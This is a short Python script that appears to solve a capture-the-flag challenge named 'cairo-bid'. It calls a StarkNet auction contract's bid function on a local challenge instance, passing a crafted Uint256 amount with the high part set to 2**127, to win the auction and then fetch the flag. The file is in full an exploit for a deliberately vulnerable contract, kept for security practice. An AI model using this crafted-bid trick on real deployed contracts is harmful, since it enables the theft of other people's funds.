import asyncio
import logging


from starknet_py.contract import Contract
from starknet_py.net import AccountClient
from starknet_py.net.gateway_client import GatewayClient
from starknet_py.net.models import StarknetChainId

from common import utils

logger = utils.setup_logger("cairo-bid")

    
async def main(hostname='127.0.0.1', port=31337):
    ctx = await utils.get_context(hostname, port)
    contract = ctx["contract"]
    acc_client = ctx["acc_client"]
    contract_address = ctx["contract_address"]

    # attack    
    logger.info("Invoke claim as player")
    invocation = await contract.functions["bid"].invoke(address=2, bid_amount={"high": int(2**127), "low": 0}, max_fee=int(4e16))
    await invocation.wait_for_acceptance()
    logger.debug("Retrieve winner")
    winner = (await contract.functions["get_winner"].call()).address
    logger.info(f"Winner: {winner}")

    flag = utils.get_flag(hostname, port)
    logger.info(f"Flag: {flag}")
    return

asyncio.run(main())
